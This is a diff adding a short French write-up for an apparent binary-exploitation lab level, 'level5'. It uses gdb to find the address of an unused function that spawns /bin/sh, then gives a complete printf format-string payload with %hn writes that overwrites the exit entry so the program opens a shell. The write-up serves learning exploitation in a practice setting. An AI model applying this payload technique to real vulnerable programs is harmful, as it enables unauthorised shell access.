@@ -1,0 +1,12 @@
+Si on effectue un objdump -d sur le programe, on voit qu'il existe une fonction qui effectue un /bin/sh (o). En regardant plus en detail, on voit que cette fonction n'est appelé nul part.
+Nous allons donc chercher a modifier l'adresse du exit ce trouvant dans une autre fonction pour la remplacer par celle de o.
+
+Pour ce faire, il nous faut d'abord trouver l'adresse de o via gdb :
+x o
+0x80484a4 <o>:	0x83e58955
+
+Ensuite, nous devons trouver l'offset de printf sur la stack. Il s'agit du 4e argument.
+
+Nous allons donc ecrire l'adresse de exit avec celle de o en utilisant de format de printf %n. Afin de ne pas a avoir a ecrire un nombre trop grand, nous allons diviser l'ecriture en deux parties. 
+
+(python -c 'print "\x08\x04\x98\x38"[::-1] + "\x08\x04\x98\x3A"[::-1] + "%2044u" + "%5$hn" + "%31904u" + "%4$hn"'; cat) | ./level5
